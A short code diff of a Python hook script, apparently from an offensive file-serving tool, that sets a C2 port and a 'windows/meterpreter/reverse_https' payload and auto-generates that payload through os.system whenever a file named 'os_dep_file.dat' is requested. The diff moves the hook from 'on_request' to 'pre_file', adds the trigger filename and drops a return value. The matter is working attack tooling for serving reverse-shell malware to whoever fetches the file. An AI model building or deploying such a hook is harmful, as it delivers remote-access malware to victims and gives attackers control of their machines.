@@ -11,10 +11,13 @@ C2_PORT = 443
 PAYLOAD = "windows/meterpreter/reverse_https"	
 
 
-@hooker.hook("on_request")
+trigger_filename = 'os_dep_file.dat'
+
+
+@hooker.hook("pre_file")
 def autogen_msf(filename, request, retvals = {}):
-	func_name = sys._getframe().f_code.co_name
-	if not check_filename_for_hook(filename, func_name):
+
+	if trigger_filename not in filename:
 		return None
 
 	extension = '.' + filename.split('.')[-1]
@@ -30,7 +33,5 @@ def autogen_msf(filename, request, retvals = {}):
 		)
 	print("[!] '{}'".format(command))
 	os.system(command)
-
-	retvals['fd'] = fd
 
 	return fd
